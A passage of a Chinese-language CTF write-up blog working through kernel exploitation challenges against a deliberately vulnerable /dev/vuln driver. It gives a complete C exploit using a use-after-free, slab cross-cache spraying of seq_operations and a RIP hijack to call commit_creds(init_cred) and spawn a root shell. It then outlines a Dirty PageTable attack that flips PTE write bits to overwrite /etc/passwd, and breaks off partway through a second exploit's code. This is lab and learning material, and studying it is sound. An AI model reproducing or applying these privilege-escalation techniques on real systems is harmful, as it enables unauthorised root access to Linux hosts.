class="string">&quot;/proc/zoneinfo&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="type">int</span> in_pagesets = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> current_cpu = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(line, <span class="string">&quot;pagesets&quot;</span>)) &#123;</span><br><span class="line">            in_pagesets = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_pagesets &amp;&amp; line[<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span> &amp;&amp; line[<span class="number">0</span>] != <span class="string">&#x27;\t&#x27;</span>) &#123;</span><br><span class="line">            in_pagesets = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_pagesets) &#123;</span><br><span class="line">            <span class="type">int</span> cpu_id;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot; cpu: %d&quot;</span>, &amp;cpu_id) == <span class="number">1</span>) &#123;</span><br><span class="line">                current_cpu = cpu_id;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> count_val;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot; count: %d&quot;</span>, &amp;count_val) == <span class="number">1</span> &amp;&amp; current_cpu != <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;CPU %d -&gt; count = %d\n&quot;</span>, current_cpu, count_val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之後去 UAF 寫掉雙數的 object 第一塊<br>這樣就有大機率寫掉 seq<br>反正沒開 SMEP SMAP<br>控制執行流程後直接跳回 Userspace 跑 <code>commit_cred(init_cred)</code>  </p>
<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc exploit.c -o exploit --static -masm=intel</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ALLOC   0xf000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_WRITE   0xf001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_FREE    0xf002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_alloc</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .id = id</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CMD_ALLOC, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_write</span><span class="params">(<span class="type">int</span> id, <span class="type">size_t</span> size, <span class="type">char</span>* data)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .id = id,</span><br><span class="line">        .size = size,</span><br><span class="line">        .data = data</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CMD_WRITE, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_free</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .id = id</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(fd, CMD_FREE, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_rsp, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;movq %0, cs\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;movq %1, ss\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;movq %2, rsp\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushfq\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;popq %3\n&quot;</span></span></span><br><span class="line"><span class="params">        : <span class="string">&quot;=r&quot;</span>(user_cs), <span class="string">&quot;=r&quot;</span>(user_ss), <span class="string">&quot;=r&quot;</span>(user_rsp), <span class="string">&quot;=r&quot;</span>(user_rflags)</span></span><br><span class="line"><span class="params">        : </span></span><br><span class="line"><span class="params">        : <span class="string">&quot;memory&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">restore_state</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;swapgs\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;movq [rsp + 0x00], %0\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;movq [rsp + 0x08], %1\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;movq [rsp + 0x10], %2\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;movq [rsp + 0x18], %3\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;movq [rsp + 0x20], %4\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;iretq\n&quot;</span></span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;r&quot;</span>(win), <span class="string">&quot;r&quot;</span>(user_cs), <span class="string">&quot;r&quot;</span>(user_rflags), <span class="string">&quot;r&quot;</span>(user_rsp), <span class="string">&quot;r&quot;</span>(user_ss)</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> addr_init_cred      0xffffffff81e3cbc0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> addr_commit_creds   0xffffffff8109f980</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">escalate_privilege</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rdi, %[init_cred]\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, %[commit]\n\t&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;call rax\n\t&quot;</span></span></span><br><span class="line"><span class="params">        :</span></span><br><span class="line"><span class="params">        : [init_cred] <span class="string">&quot;r&quot;</span> (addr_init_cred),</span></span><br><span class="line"><span class="params">          [commit] <span class="string">&quot;r&quot;</span> (addr_commit_creds)</span></span><br><span class="line"><span class="params">        : <span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rdi&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    restore_state();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/vuln&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Open /dev/vuln failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> obj_per_slab = <span class="number">8</span>;</span><br><span class="line">    <span class="type">int</span> cpu_partial = <span class="number">52</span>;</span><br><span class="line">    <span class="type">int</span> spray_obj_num = obj_per_slab * (cpu_partial + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;allocate obj_per_slab * (cpu_partial + 1) slabs&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; spray_obj_num; i++)&#123;</span><br><span class="line">        obj_alloc(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;create one new active slab&quot;</span>);</span><br><span class="line">    obj_alloc(spray_obj_num);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Freeing objects to release order-0 pages back to the buddy allocator&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; spray_obj_num; i += obj_per_slab) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % (obj_per_slab * <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i; j &lt; i + obj_per_slab; j++) &#123;</span><br><span class="line">                obj_free(j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            obj_free(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Spraying struct seq_operations to reclaim order-0 pages&quot;</span>);</span><br><span class="line">    <span class="type">int</span> seqfds[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++) &#123;</span><br><span class="line">        seqfds[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        assert(seqfds[i] &gt;= <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hijacking RIP&quot;</span>);</span><br><span class="line">    <span class="type">char</span> payload[<span class="number">0x8</span>];</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> *)&amp;payload = (<span class="type">unsigned</span> <span class="type">long</span>)escalate_privilege;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; spray_obj_num; i += obj_per_slab) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % (obj_per_slab * <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            obj_write(i, <span class="number">0x8</span>, payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; i++) &#123;</span><br><span class="line">        read(seqfds[i], payload, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Dirty-PageTable"><a href="#Dirty-PageTable" class="headerlink" title="Dirty PageTable"></a>Dirty PageTable</h2><h3 id="analyze-1"><a href="#analyze-1" class="headerlink" title="analyze"></a>analyze</h3><p>基本上跟第一題一樣</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_alloc</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (objs[id] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    objs[id] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (objs[id] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_read</span><span class="params">(<span class="type">int</span> id, <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (objs[id] == <span class="literal">NULL</span> || size &gt; OBJ_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(data, objs[id]-&gt;buf, size) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_write</span><span class="params">(<span class="type">int</span> id, <span class="type">char</span> *data, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (objs[id] == <span class="literal">NULL</span> || size &gt; OBJ_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(objs[id]-&gt;buf, data, size) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">obj_free</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    kmem_cache_free(obj_cachep, objs[id]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不過多了一個 obj_read 可以用<br>並且啟動參數把 SMAP SMEP KASLR 都打開了  </p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -cpu qemu64,+smap,+smep \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -drive file=rootfs.ext3,format=raw \</span><br><span class="line">    -drive file=flag.txt,format=raw \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -smp 1 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/sda rw init=/init console=ttyS0 kaslr pti=on loglevel=3 oops=panic panic=-1&quot;</span> </span><br></pre></td></tr></table></figure>

<h3 id="attack-1"><a href="#attack-1" class="headerlink" title="attack"></a>attack</h3><p>首先是因為打開 SMEP SMAP 所以無法簡單的通過 control rip<br>來跳到 userspace 的 code 來去提權  </p>
<p>所以這邊使用一個 data only 方式來打<br>通過去 spray mapping 產生的 PTE struct 來 cross cacch 去複寫  </p>
<img src="/2025/10/24/speed-run-r1rn-kernel-challenge/PTE.png" class="">

<p>這個結構上的第二個 bits 是管理 R&#x2F;W 權限的<br>當我們去 mapping 到 <code>/etc/passwd</code> 想要去複寫的時候，因為原本只有可讀所以無法改寫<br>但是通過 UAF 寫掉 R&#x2F;W 位就可以改變權限讓 <code>/etc/passwd</code> 可寫<br>去改寫密碼來提權 <code>openssl passwd -1 -salt naup naup96321</code>  </p>
<h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc exploit.c -o exploit --static -masm=intel</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ALLOC   0xf000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_READ    0xf001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_WRITE   0xf002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_FREE    0xf003</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> etcpasswd_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_alloc</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .id = id</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CMD_ALLOC, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_write</span><span class="params">(<span class="type">int</span> id, <span class="type">size_t</span> size, <span class="type">char</span>* data)</span> &#123;</span><br><span class="line">    <span class="type">request_t</span> req = &#123;</span><br><span class="line">        .id = id,</span><br><span class="line">        .size = size,</span><br><span class="line">        .data = data</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CMD_WRITE, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">obj_read</span><span class="params">(<span class="type">int</span> id, <span 